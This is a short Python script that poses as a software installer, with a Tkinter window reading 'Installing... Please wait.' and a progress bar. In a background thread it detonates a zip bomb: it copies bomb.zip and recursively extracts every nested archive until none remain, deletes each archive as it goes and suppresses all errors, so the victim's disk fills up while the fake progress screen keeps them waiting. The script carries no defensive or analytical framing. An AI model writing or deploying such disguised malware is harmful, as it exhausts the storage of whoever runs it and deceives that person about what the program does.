import zipfile
import os
import threading
import time
import tkinter as tk
from tkinter import ttk
import shutil

def extract_all_recursive(base_dir, progress_callback):
    round = 0
    while True:
        found = False
        for root, dirs, files in os.walk(base_dir):
            for file in files:
                if file.endswith(".zip"):
                    zip_path = os.path.join(root, file)
                    target_dir = os.path.join(root, file + "_unzipped")
                    try:
                        with zipfile.ZipFile(zip_path, 'r') as zf:
                            zf.extractall(target_dir)
                        os.remove(zip_path)
                        found = True
                        progress_callback()
                    except Exception as e:
                        pass
        if not found:
            break
        round += 1

def detonate_zip_bomb():
    os.makedirs("bomb_detonated", exist_ok=True)
    shutil.copy("bomb.zip", "bomb_detonated/bomb.zip")
    extract_all_recursive("bomb_detonated", progress_step)

def progress_step():
    global progress
    progress += 1
    if progress < 100:
        bar["value"] = progress
        root.update_idletasks()

def run_gui():
    global root, bar, progress
    progress = 0
    root = tk.Tk()
    root.title("Installer")
    root.geometry("300x100")
    ttk.Label(root, text="Installing... Please wait.").pack(pady=10)
    bar = ttk.Progressbar(root, length=250, mode='determinate', maximum=100)
    bar.pack(pady=10)
    threading.Thread(target=detonate_zip_bomb, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    run_gui()
